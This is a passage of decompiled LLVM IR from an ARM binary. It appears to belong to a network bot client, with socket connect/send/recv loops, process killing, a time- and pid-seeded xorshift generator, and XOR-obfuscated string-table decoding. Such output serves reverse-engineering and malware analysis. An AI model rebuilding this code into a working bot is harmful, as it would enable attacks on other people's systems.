  %v2_10480 = load i32, i32* %v1_10480, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_1048c = call i32 @send(i32 %v2_10480, i32* nonnull %stack_var_-140, i32 %v4_10474, i32 16384)
  br label %dec_label_pc_10058.backedge

dec_label_pc_10494:                               ; preds = %dec_label_pc_104d4, %dec_label_pc_10274
  %v0_10494 = load i32, i32* @r8, align 4
  %v1_10494 = inttoptr i32 %v0_10494 to i32*
  %v2_10494 = load i32, i32* %v1_10494, align 4
  store i32 %v2_10494, i32* %r3.global-to-local, align 4
  %v7_10498 = icmp eq i32 %v2_10494, 4
  br i1 %v7_10498, label %dec_label_pc_10058.backedge, label %bb51

bb51:                                             ; preds = %dec_label_pc_10494
  %v8_1049c = icmp eq i32 %v2_10494, 11
  br i1 %v8_1049c, label %dec_label_pc_10058.backedge, label %dec_label_pc_104a4

dec_label_pc_104a4:                               ; preds = %dec_label_pc_104fc, %bb51, %dec_label_pc_102ac
  %v2_104a4 = load i32, i32* @global_var_1c190.181, align 4
  %v1_104ac = icmp ne i32 %v2_104a4, -1
  call void @__pseudo_cond_branch(i1 %v1_104ac, i32 ptrtoint (i32* @global_var_8d50.77 to i32))
  store i32 ptrtoint (i32* @global_var_1c190.181 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_1c190.181, align 4
  %v1_104c0 = call i32 @sleep(i32 1)
  br label %dec_label_pc_10058.backedge

dec_label_pc_104c8:                               ; preds = %dec_label_pc_103e4
  %v2_104cc = call i32 @kill(i32 %v2_1041c, i32 9)
  br label %dec_label_pc_10428

dec_label_pc_104d4:                               ; preds = %dec_label_pc_102c4
  %v0_104d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_104d4 = load i32, i32* @r8, align 4
  %v2_104d4 = inttoptr i32 %v1_104d4 to i32*
  store i32 %v0_104d4, i32* %v2_104d4, align 4
  store i32 %v2_104dc, i32* @r4, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_104e8 = load i32, i32* @global_var_1c190.181, align 4
  %v9_104f0 = call i32 @recv(i32 %v2_104e8, i32* nonnull %stack_var_-1548, i32 %v4_102cc, i32 16386)
  %v7_104f4 = icmp eq i32 %v9_104f0, -1
  br i1 %v7_104f4, label %dec_label_pc_10494, label %dec_label_pc_104fc

dec_label_pc_104fc:                               ; preds = %dec_label_pc_104d4
  %v2_104fc = icmp eq i32 %v9_104f0, 0
  br i1 %v2_104fc, label %dec_label_pc_104a4, label %dec_label_pc_10504

dec_label_pc_10504:                               ; preds = %dec_label_pc_104fc
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_10514 = load i32, i32* @global_var_1c190.181, align 4
  %v5_10518 = call i32 @recv(i32 %v2_10514, i32* nonnull %v7_10380, i32 2, i32 16384)
  %v3_1051c = load i8*, i8** %stack_var_-38, align 4
  %v4_1051c = ptrtoint i8* %v3_1051c to i32
  %v4_10520 = urem i32 %v4_102d0, 256
  %v4_10524 = mul i32 %v4_1051c, 256
  %v5_10524 = or i32 %v4_10524, %v4_10520
  store i32 %v5_10524, i32* %r2.global-to-local, align 4
  %v3_1052c = sdiv i32 %v4_10524, 256
  store i32 %v3_1052c, i32* @lr, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_10538 = load i32, i32* @global_var_1c190.181, align 4
  %v6_10540 = inttoptr i32 %v5_10524 to i8*
  store i8* %v6_10540, i8** %stack_var_-38, align 4
  %v8_10544 = call i32 @recv(i32 %v2_10538, i32* nonnull %stack_var_-1548, i32 %v5_10524, i32 16384)
  %v3_10548 = load i8*, i8** %stack_var_-38, align 4
  %v4_10548 = ptrtoint i8* %v3_10548 to i32
  store i32 %v4_10548, i32* @r2, align 4
  %v4_1054c = urem i32 %v3_1052c, 256
  store i32 %v4_1054c, i32* %r3.global-to-local, align 4
  %v6_10550 = mul nuw nsw i32 %v4_1054c, 256
  %v7_10550 = or i32 %v4_10548, %v6_10550
  %v9_10550 = icmp eq i32 %v7_10550, 0
  br i1 %v9_10550, label %dec_label_pc_10058.backedge, label %dec_label_pc_10558

dec_label_pc_10558:                               ; preds = %dec_label_pc_10504
  %v7_1055c = call i32 @function_ad94(i32* nonnull %stack_var_-1548, i32 %v7_10550, i32 %v4_10548, i32 %v4_1054c)
  br label %dec_label_pc_10058.backedge

dec_label_pc_10564:                               ; preds = %dec_label_pc_102b4
  %v2_10568 = load i32, i32* @global_var_1c190.181, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_10578 = call i32 @recv(i32 %v2_10568, i32* nonnull %v7_10380, i32 2, i32 16384)
  br label %dec_label_pc_10058.backedge

; uselistorder directives
  uselistorder i32 %v4_1054c, { 2, 0, 1 }
  uselistorder i32 %v4_10548, { 1, 0, 2 }
  uselistorder i32 %v3_1052c, { 1, 0 }
  uselistorder i32 %v5_10524, { 1, 0, 2 }
  uselistorder i32 %v4_10524, { 1, 0 }
  uselistorder i32 %v9_104f0, { 1, 0 }
  uselistorder i32 %v3_10304, { 1, 3, 2, 0 }
  uselistorder i32 %v4_102cc, { 2, 3, 0, 1 }
  uselistorder i32 %v5_102a0, { 1, 0 }
  uselistorder i32 %v2_10240, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v2_10180, { 3, 2, 1, 0 }
  uselistorder i32 %v13_10144, { 2, 3, 1, 0 }
  uselistorder i32 %v2_1008c, { 2, 1, 0 }
  uselistorder i32 %v1_1007c, { 1, 2, 0 }
  uselistorder i32 %v1_10064, { 1, 2, 0 }
  uselistorder i32* %v7_10380, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v2_ff64, { 1, 0, 2, 3 }
  uselistorder i32 %v2_fefc, { 0, 1, 9, 2, 3, 8, 4, 5, 6, 7, 10 }
  uselistorder i32 %v2_feec, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_fe2c, { 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %stack_var_-140, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i8** %stack_var_-38, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-1548, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 0, 1, 3, 4, 5, 7, 6, 8, 9, 10, 11, 2, 12, 13, 14, 26, 27, 18, 19, 15, 24, 25, 16, 17, 20, 21, 22, 23 }
  uselistorder i32* %r2.global-to-local, { 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* @r2, { 1, 0, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* @global_var_1c1cc.169, { 1, 2, 0 }
  uselistorder i8 1, { 1, 0, 2, 3, 4 }
  uselistorder i32 16386, { 1, 3, 0, 4, 2, 5 }
  uselistorder i32 (i32)* @sleep, { 2, 1, 5, 3, 4, 9, 8, 7, 6, 0, 10 }
  uselistorder i8* bitcast (i8** @global_var_1c1d0.184 to i8*), { 0, 1, 3, 2 }
  uselistorder i8** @global_var_1c1d0.184, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1c1d0.184 to i32), { 2, 1, 0 }
  uselistorder i32* @global_var_1c18c.164, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9 }
  uselistorder i32* @global_var_1c190.181, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15 }
  uselistorder i32 (i32)* @function_fd0c, { 1, 0 }
  uselistorder i32 (i32)* @function_f828, { 1, 0 }
  uselistorder i32 (i32)* @function_b070, { 1, 0 }
  uselistorder i32 (i32, i32*, i32)* @write, { 1, 0, 2 }
  uselistorder i32 (i8*, i32)* @function_12d5c, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 56, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32 (i32, i32)* @function_10664, { 10, 9, 8, 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32)* @function_fb9c, { 1, 0 }
  uselistorder i32* @global_var_1c194.156, { 2, 3, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_fb4c.154 to i32), { 0, 2, 1 }
  uselistorder void (i32)* (i32, void (i32)*)* @signal, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10428, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_10058.backedge, { 5, 4, 9, 3, 8, 13, 2, 7, 1, 0, 12, 11, 6, 10 }
  uselistorder label %dec_label_pc_1017c, { 2, 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_100cc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100bc, { 1, 0 }
  uselistorder label %dec_label_pc_10078.dec_label_pc_10078_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10060.dec_label_pc_10060_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_feb8, { 2, 0, 1 }
}

define i32 @function_105b0() local_unnamed_addr {
dec_label_pc_105b0:
  %v2_105bc = load i32, i32* @global_var_1c1d4.190, align 4
  %v2_105c0 = load i32, i32* @global_var_1c1e0.192, align 4
  store i32 ptrtoint (i32* @global_var_1c1d8.194 to i32), i32* @lr, align 4
  %v4_105cc = mul i32 %v2_105bc, 2048
  %v5_105cc = xor i32 %v4_105cc, %v2_105bc
  %v4_105d0 = udiv i32 %v2_105c0, 524288
  %v5_105d0 = xor i32 %v4_105d0, %v2_105c0
  %v2_105d4 = load i32, i32* @global_var_1c1d8.194, align 4
  %v2_105d8 = load i32, i32* @global_var_1c1dc.196, align 4
  %v2_105dc = xor i32 %v5_105d0, %v5_105cc
  %v4_105e0 = udiv i32 %v5_105cc, 256
  %v5_105e0 = xor i32 %v2_105dc, %v4_105e0
  store i32 %v2_105d4, i32* @global_var_1c1d4.190, align 4
  store i32 %v2_105d8, i32* @global_var_1c1d8.194, align 4
  store i32 %v2_105c0, i32* @global_var_1c1dc.196, align 4
  store i32 %v5_105e0, i32* @global_var_1c1e0.192, align 4
  ret i32 %v5_105e0

; uselistorder directives
  uselistorder i32 %v2_105c0, { 2, 1, 0 }
  uselistorder i32 %v2_105bc, { 1, 0 }
}

define i32 @function_10608(i32 %arg1) local_unnamed_addr {
dec_label_pc_10608:
  %stack_var_-12 = alloca i32, align 4
  %v3_10608 = load i32, i32* @r4, align 4
  store i32 %v3_10608, i32* %stack_var_-12, align 4
  %v2_10610 = call i32 @time(i32* null)
  store i32 %v2_10610, i32* @global_var_1c1d4.190, align 4
  %v2_1061c = call i32 @getpid()
  %v0_10624 = call i32 @getppid()
  %v2_1062c = xor i32 %v2_1061c, %v0_10624
  store i32 %v2_1062c, i32* @global_var_1c1d8.194, align 4
  %v1_10634 = call i32 @clock()
  %v2_10638 = load i32, i32* @global_var_1c1d8.194, align 4
  %v2_10644 = xor i32 %v2_10638, %v1_10634
  store i32 %v2_10644, i32* @global_var_1c1e0.192, align 4
  store i32 %v1_10634, i32* @global_var_1c1dc.196, align 4
  %v2_10650 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10650, i32* @r4, align 4
  ret i32 %v1_10634

; uselistorder directives
  uselistorder i32 %v1_10634, { 1, 2, 0 }
}

define i32 @function_10664(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10664:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10664 = load i32, i32* @r4, align 4
  store i32 %v3_10664, i32* %stack_var_-36, align 4
  %v6_10664 = load i32, i32* @r5, align 4
  %v9_10664 = load i32, i32* @r6, align 4
  %v12_10664 = load i32, i32* @r7, align 4
  %v28_10664 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v1_10678 = call i32 @function_12280(i32 61)
  %v3_10684 = call i32 @function_1219c(i32 61, i32* null)
  %v1_10688 = inttoptr i32 %v3_10684 to i8*
  %tmp12 = bitcast i32* %stack_var_-68 to i8*
  %v6_10690 = call i8* @strcpy(i8* %tmp12, i8* %v1_10688)
  %v2_10694 = icmp eq i32 %arg2, 0
  br i1 %v2_10694, label %dec_label_pc_10710, label %dec_label_pc_1069c

dec_label_pc_1069c:                               ; preds = %dec_label_pc_10664
  store i32 ptrtoint (i32* @global_var_1c1d4.190 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1c1d8.194 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1c1dc.196 to i32), i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_1c1e0.192 to i32), i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_106b0

dec_label_pc_106b0:                               ; preds = %dec_label_pc_106b0.dec_label_pc_106b0_crit_edge, %dec_label_pc_1069c
  %v1_106d4 = phi i32 [ %v1_106d4.pre, %dec_label_pc_106b0.dec_label_pc_106b0_crit_edge ], [ ptrtoint (i32* @global_var_1c1d4.190 to i32), %dec_label_pc_1069c ]
  %v2_106b0 = load i32, i32* @global_var_1c1e0.192, align 4
  store i32 %v2_106b0, i32* %r2.global-to-local, align 4
  %v2_106b4 = load i32, i32* @global_var_1c1d4.190, align 4
  %v4_106b8 = udiv i32 %v2_106b0, 524288
  %v5_106b8 = xor i32 %v4_106b8, %v2_106b0
  %v4_106bc = mul i32 %v2_106b4, 2048
  %v5_106bc = xor i32 %v4_106bc, %v2_106b4
  %v2_106c0 = xor i32 %v5_106b8, %v5_106bc
  %v2_106c4 = load i32, i32* @global_var_1c1d8.194, align 4
  %v2_106c8 = load i32, i32* @global_var_1c1dc.196, align 4
  store i32 %v2_106c8, i32* %ip.global-to-local, align 4
  %v4_106cc = udiv i32 %v5_106bc, 256
  %v5_106cc = xor i32 %v2_106c0, %v4_106cc
  store i32 %v5_106cc, i32* @r4, align 4
  %v2_106d4 = inttoptr i32 %v1_106d4 to i32*
  store i32 %v2_106c4, i32* %v2_106d4, align 4
  %v0_106d8 = load i32, i32* %ip.global-to-local, align 4
  %v1_106d8 = load i32, i32* %r8.global-to-local, align 4
  %v2_106d8 = inttoptr i32 %v1_106d8 to i32*
  store i32 %v0_106d8, i32* %v2_106d8, align 4
  %v0_106dc = load i32, i32* %r2.global-to-local, align 4
  %v1_106dc = load i32, i32* @r7, align 4
  %v2_106dc = inttoptr i32 %v1_106dc to i32*
  store i32 %v0_106dc, i32* %v2_106dc, align 4
  %v0_106e0 = load i32, i32* @r4, align 4
  %v1_106e0 = load i32, i32* @r6, align 4
  %v2_106e0 = inttoptr i32 %v1_106e0 to i32*
  store i32 %v0_106e0, i32* %v2_106e0, align 4
  %v2_106e4 = call i32 @function_12d34(i8* %tmp12)
  %v0_106ec = load i32, i32* @r4, align 4
  %v2_106f0 = urem i32 %v0_106ec, %v2_106e4
  %v2_106f8 = add i32 %v2_106f0, %v28_10664
  %v1_106fc = add i32 %v2_106f8, -32
  %v2_106fc = inttoptr i32 %v1_106fc to i8*
  %v3_106fc = load i8, i8* %v2_106fc, align 1
  %v2_10700 = load i32, i32* @r5, align 4
  %v3_10700 = load i32, i32* %fp.global-to-local, align 4
  %v4_10700 = add i32 %v3_10700, %v2_10700
  %v5_10700 = inttoptr i32 %v4_10700 to i8*
  store i8 %v3_106fc, i8* %v5_10700, align 1
  %v0_10704 = load i32, i32* @r5, align 4
  %v1_10704 = add i32 %v0_10704, 1
  store i32 %v1_10704, i32* @r5, align 4
  %v1_10708 = load i32, i32* %sb.global-to-local, align 4
  %v9_10708 = icmp eq i32 %v1_10704, %v1_10708
  br i1 %v9_10708, label %dec_label_pc_10710, label %dec_label_pc_106b0.dec_label_pc_106b0_crit_edge

dec_label_pc_106b0.dec_label_pc_106b0_crit_edge:  ; preds = %dec_label_pc_106b0
  %v1_106d4.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_106b0

dec_label_pc_10710:                               ; preds = %dec_label_pc_106b0, %dec_label_pc_10664
  %v1_10714 = call i32 @function_121c8(i32 61)
  %v2_1071c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1071c, i32* @r4, align 4
  store i32 %v6_10664, i32* @r5, align 4
  store i32 %v9_10664, i32* @r6, align 4
  store i32 %v12_10664, i32* @r7, align 4
  ret i32 %v1_10714

; uselistorder directives
  uselistorder i32 %v2_106b4, { 1, 0 }
  uselistorder i32 %v2_106b0, { 1, 0, 2 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32 -32, { 1, 0 }
  uselistorder i32* @global_var_1c1e0.192, { 2, 4, 1, 0, 3 }
  uselistorder i32* @global_var_1c1dc.196, { 2, 4, 1, 0, 3 }
  uselistorder i32* @global_var_1c1d8.194, { 2, 3, 1, 0, 4, 5 }
  uselistorder i32* @global_var_1c1d4.190, { 2, 4, 1, 0, 3 }
}

define i32 @function_10730(i32 %arg1) local_unnamed_addr {
dec_label_pc_10730:
  %v2_10734 = load i32, i32* @global_var_1c23c.206, align 4
  %v2_1073c = call i32 @kill(i32 %v2_10734, i32 9)
  %v0_10740 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10740, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_10730
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_10730, %bb
  ret i32 %v2_1073c

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 2, 4, 3, 1, 5, 0, 6 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_10744() local_unnamed_addr {
dec_label_pc_10744:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10744 = load i32, i32* @r4, align 4
  store i32 %v3_10744, i32* %stack_var_-16, align 4
  %v0_10748 = load i32, i32* @r0, align 4
  store i32 %v0_10748, i32* %r5.global-to-local, align 4
  %v1_1074c = add i32 %v0_10748, 4
  %v2_1074c = inttoptr i32 %v1_1074c to i32*
  %v3_1074c = load i32, i32* %v2_1074c, align 4
  store i32 %v3_1074c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-32, align 4
  %v1_1076c = icmp ne i32 %v3_1074c, -1
  call void @__pseudo_cond_branch(i1 %v1_1076c, i32 ptrtoint (i32* @global_var_8d50.77 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_1077c = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_1077c, i32* %r3.global-to-local, align 4
  %v7_10784 = icmp eq i32 %v3_1077c, -1
  %v0_1078c = load i32, i32* %r5.global-to-local, align 4
  %v1_1078c = add i32 %v0_1078c, 28
  store i32 %v1_1078c, i32* %r0.global-to-local, align 4
  %v2_10790 = add i32 %v0_1078c, 4
  %v3_10790 = inttoptr i32 %v2_10790 to i32*
  store i32 %v3_1077c, i32* %v3_10790, align 4
  br i1 %v7_10784, label %dec_label_pc_10744.dec_label_pc_1080c_crit_edge, label %dec_label_pc_10798

dec_label_pc_10744.dec_label_pc_1080c_crit_edge:  ; preds = %dec_label_pc_10744
  %v14_10810.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1080c

dec_label_pc_10798:                               ; preds = %dec_label_pc_10744
  %v0_10798 = load i32, i32* %r6.global-to-local, align 4
  %v1_10798 = load i32, i32* %r5.global-to-local, align 4
  %v2_10798 = add i32 %v1_10798, 24
  %v3_10798 = inttoptr i32 %v2_10798 to i32*
  store i32 %v0_10798, i32* %v3_10798, align 4
  %v0_1079c = load i32, i32* %r0.global-to-local, align 4
  %v2_1079c = call i32 @function_12dd4(i32 %v0_1079c, i32 256)
  store i32 %v2_1079c, i32* %r0.global-to-local, align 4
  %v0_107a0 = load i32, i32* %r5.global-to-local, align 4
  %v1_107a0 = add i32 %v0_107a0, 4
  %v2_107a0 = inttoptr i32 %v1_107a0 to i32*
  %v3_107a0 = load i32, i32* %v2_107a0, align 4
  store i32 %v3_107a0, i32* %r0.global-to-local, align 4
  %v2_107b0 = call i32 (i32, i32, ...) @fcntl(i32 %v3_107a0, i32 3)
  store i32 %v3_107a0, i32* %r0.global-to-local, align 4
  %v2_107c0 = call i32 (i32, i32, ...) @fcntl(i32 %v3_107a0, i32 4)
  store i32 %v2_107c0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1c218.208 to i32), i32* %r3.global-to-local, align 4
  %v0_107c8 = load i32, i32* %r5.global-to-local, align 4
  %v2_107cc = load i32, i32* @global_var_1c218.208, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_107d8 = add i32 %v0_107c8, 8
  %v3_107d8 = inttoptr i32 %v2_107d8 to i32*
  store i32 %v2_107cc, i32* %v3_107d8, align 4
  %v0_107dc = load i32, i32* %r3.global-to-local, align 4
  %v1_107dc = load i32, i32* %r5.global-to-local, align 4
  %v2_107dc = add i32 %v1_107dc, 12
  %v3_107dc = inttoptr i32 %v2_107dc to i32*
  store i32 %v0_107dc, i32* %v3_107dc, align 4
  %v0_107e4 = load i32, i32* %r5.global-to-local, align 4
  %v1_107e4 = add i32 %v0_107e4, 4
  %v2_107e4 = inttoptr i32 %v1_107e4 to i32*
  %v3_107e4 = load i32, i32* %v2_107e4, align 4
  store i32 %v3_107e4, i32* %r0.global-to-local, align 4
  %v0_107e8 = load i32, i32* %r3.global-to-local, align 4
  %v2_107e8 = mul i32 %v0_107e8, 2
  store i32 %v2_107e8, i32* %r3.global-to-local, align 4
  %tmp13 = bitcast i32* %stack_var_-32 to %sockaddr*
  store i32 %v2_107e8, i32* %stack_var_-32, align 4
  %v5_10808 = call i32 @connect(i32 %v3_107e4, %sockaddr* %tmp13, i32 16)
  store i32 %v5_10808, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1080c

dec_label_pc_1080c:                               ; preds = %dec_label_pc_10744.dec_label_pc_1080c_crit_edge, %dec_label_pc_10798
  %v14_10810 = phi i32 [ %v14_10810.pre, %dec_label_pc_10744.dec_label_pc_1080c_crit_edge ], [ %v5_10808, %dec_label_pc_10798 ]
  %v2_10810 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_10810, i32* @r4, align 4
  ret i32 %v14_10810

; uselistorder directives
  uselistorder i32 %v2_107e8, { 1, 0 }
  uselistorder i32 %v3_107a0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1077c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 8, 5, 6, 7, 9, 10 }
  uselistorder i32 (i32, i32)* @function_12dd4, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1080c, { 1, 0 }
}

define i32 @function_10818(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10818:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1c1e4.210 to i32), i32* %r8.global-to-local, align 4
  %v2_10820 = load i32, i32* @global_var_1c1e4.210, align 4
  store i32 ptrtoint (i32* @global_var_1c210.212 to i32), i32* %sb.global-to-local, align 4
  %v3_1082c = mul i32 %v2_10820, 16
  store i32 %v3_1082c, i32* %r3.global-to-local, align 4
  %v3_10834 = urem i32 %arg3, 65536
  store i32 %v3_10834, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_10840 = load i32, i32* @global_var_1c210.212, align 4
  %v1_10844 = add i32 %v3_1082c, 16
  store i32 %v1_10844, i32* %r1.global-to-local, align 4
  store i32 %v3_10834, i32* %stack_var_-44, align 4
  %v15_1084c = inttoptr i32 %v2_10840 to i32*
  %v16_1084c = call i32* @realloc(i32* %v15_1084c, i32 %v1_10844)
  %v18_1084c = ptrtoint i32* %v16_1084c to i32
  store i32 %v18_1084c, i32* %sl.global-to-local, align 4
  %v0_10854 = load i32, i32* %r5.global-to-local, align 4
  %v1_10858 = load i32, i32* %sb.global-to-local, align 4
  %v2_10858 = inttoptr i32 %v1_10858 to i32*
  store i32 %v18_1084c, i32* %v2_10858, align 4
  %v2_1085c = load i32, i32* @global_var_1c1e4.210, align 4
  store i32 %v2_1085c, i32* %fp.global-to-local, align 4
  %v1_10860 = inttoptr i32 %v0_10854 to i8*
  %v2_10860 = call i32 @function_12d34(i8* %v1_10860)
  %sext = mul i32 %v2_10860, 16777216
  %v1_10864 = sdiv i32 %sext, 16777216
  %v2_10864 = add nsw i32 %v1_10864, 1
  store i32 %v1_10864, i32* %r7.global-to-local, align 4
  %v1_10870 = call i32* @malloc(i32 %v2_10864)
  %v3_10870 = ptrtoint i32* %v1_10870 to i32
  %v0_10874 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10874, i32* %r1.global-to-local, align 4
  store i32 %v2_10864, i32* %r2.global-to-local, align 4
  store i32 %v3_10870, i32* %r6.global-to-local, align 4
  %v3_10880 = call i32 @function_12db0(i32 %v3_10870, i32 %v0_10874, i32 %v2_10864)
  %v0_10884 = load i32, i32* %r7.global-to-local, align 4
  %tmp23 = icmp slt i32 %v0_10884, 1
  %extract.t8 = trunc i32 %v0_10884 to i8
  br i1 %tmp23, label %dec_label_pc_108b0, label %dec_label_pc_1088c

dec_label_pc_1088c:                               ; preds = %dec_label_pc_10818
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 -81, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10894

dec_label_pc_10894:                               ; preds = %dec_label_pc_10894.dec_label_pc_10894_crit_edge, %dec_label_pc_1088c
  %v1_1089c = phi i32 [ %v1_1089c.pre, %dec_label_pc_10894.dec_label_pc_10894_crit_edge ], [ -81, %dec_label_pc_1088c ]
  %v2_108a0 = phi i32 [ %v1_108a4, %dec_label_pc_10894.dec_label_pc_10894_crit_edge ], [ 0, %dec_label_pc_1088c ]
  %v1_10894 = load i32, i32* %r6.global-to-local, align 4
  %v2_10894 = add i32 %v1_10894, %v2_108a0
  %v3_10894 = inttoptr i32 %v2_10894 to i8*
  %v4_10894 = load i8, i8* %v3_10894, align 1
  %v6_10894 = zext i8 %v4_10894 to i32
  %v1_10898 = sub i32 -1, %v1_1089c
  %v2_1089c = xor i32 %v6_10894, %v1_10898
  store i32 %v2_1089c, i32* %r3.global-to-local, align 4
  %v1_108a0 = trunc i32 %v2_1089c to i8
  store i8 %v1_108a0, i8* %v3_10894, align 1
  %v0_108a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_108a4 = add i32 %v0_108a4, 1
  store i32 %v1_108a4, i32* %r2.global-to-local, align 4
  %v0_108a8 = load i32, i32* %r7.global-to-local, align 4
  %v9_108a8 = icmp eq i32 %v0_108a8, %v1_108a4
  br i1 %v9_108a8, label %dec_label_pc_108b0.loopexit, label %dec_label_pc_10894.dec_label_pc_10894_crit_edge

dec_label_pc_10894.dec_label_pc_10894_crit_edge:  ; preds = %dec_label_pc_10894
  %v1_1089c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10894

dec_label_pc_108b0.loopexit:                      ; preds = %dec_label_pc_10894
  %extract.t = trunc i32 %v1_108a4 to i8
  br label %dec_label_pc_108b0

dec_label_pc_108b0:                               ; preds = %dec_label_pc_108b0.loopexit, %dec_label_pc_10818
  %v0_108c0.off0 = phi i8 [ %extract.t, %dec_label_pc_108b0.loopexit ], [ %extract.t8, %dec_label_pc_10818 ]
  %v2_108b0 = load i32, i32* @global_var_1c1e4.210, align 4
  %v2_108b4 = load i32, i32* @global_var_1c210.212, align 4
  store i32 %v2_108b4, i32* %r2.global-to-local, align 4
  %v3_108b8 = mul i32 %v2_108b0, 16
